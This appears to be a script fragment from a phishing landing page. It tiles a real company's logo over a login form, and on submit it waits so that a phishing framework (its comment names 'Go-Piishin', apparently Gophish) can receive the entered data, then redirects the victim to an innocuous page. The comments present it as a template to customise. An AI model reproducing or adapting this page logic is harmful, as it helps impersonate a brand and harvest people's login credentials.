    <script>
        // Generate Watermark Logos
        const container = document.getElementById('watermark-overlay');
        const logoUrl = 'https://iprogrammer.com/wp-content/uploads/2024/11/iProgrammer-logo.webp';
        for (let i = 0; i < 35; i++) {
            const img = document.createElement('img');
            img.src = logoUrl;
            img.classList.add('watermark-item');
            container.appendChild(img);
        }

        // Redirect user after submission
        const form = document.getElementById('login-form');
        form.addEventListener('submit', function() {
            setTimeout(() => {
                window.location.href = "https://abc.com"; // change to your thank-you page
            }, 500); // delay to ensure Go-Piishin receives the data
        });
    </script>

